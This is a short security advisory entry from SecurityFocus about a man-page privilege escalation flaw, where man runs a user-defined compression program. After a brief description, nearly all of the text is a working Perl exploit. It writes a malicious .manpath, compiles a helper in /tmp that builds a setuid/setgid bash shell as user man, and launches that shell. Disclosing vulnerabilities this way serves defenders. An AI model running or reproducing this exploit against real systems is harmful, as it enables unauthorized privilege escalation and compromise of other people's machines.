source: http://www.securityfocus.com/bid/8675/info

A vulnerability has been reported in man that may allow an attacker to gain elevated privileges. The problem lies in man failing to carry out sufficient sanity checks before executing a user-defined compression program. As a result, it may be possible for an attacker to execute arbitrary code with user 'man' privileges. 

#!/usr/bin/perl

# (C) 2003 Sebastian Krahmer PoC UID man exploit. Bug
# originally reported to me by author (Huh, thats strange direction I
# know, but I reported another hole first. :-)
#
# If it doesnt work, use a different manpage, one that isnt already
# compressed (seldom used).

print "A manpage will soon pop up. Please press 'q' then (ENTER)\n\n";
<STDIN>;

my $mp = ">$ENV{HOME}/.manpath";
open(MP, $mp) or die;
print MP "DEFINE compressor /tmp/compress0r\n";
close MP;

open(T, ">/tmp/compress0r.c") or die $!;
print T<<EOT;
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
  setresuid(13, 13, 13);
  setresgid(62, 62, 62);
  system("cc /tmp/boomsh.c -o /tmp/boomsh");
  chmod("/tmp/boomsh", 06755);
  return 0;
}
EOT
close T;
system("cc -o /tmp/compress0r /tmp/compress0r.c");

open(BS, ">/tmp/boomsh.c") or die $!;
print BS<<_EOBS_;
#include <stdio.h>
int main()
{
  char *a[] = {"/bin/bash", "--norc", "--noprofile", NULL};

  setresuid(13, 13, 13);
  setresgid(62, 62, 62);
  execve(*a, a, NULL);
  return -1;
}
_EOBS_
close BS;

if (($pid = fork()) == 0) {
	exec("man", "yuvsplittoppm"); # some not-already-zipped page
	exit;
} else {
	wait;
}

print "Entering UID man shell...\n";
exec("/tmp/boomsh");


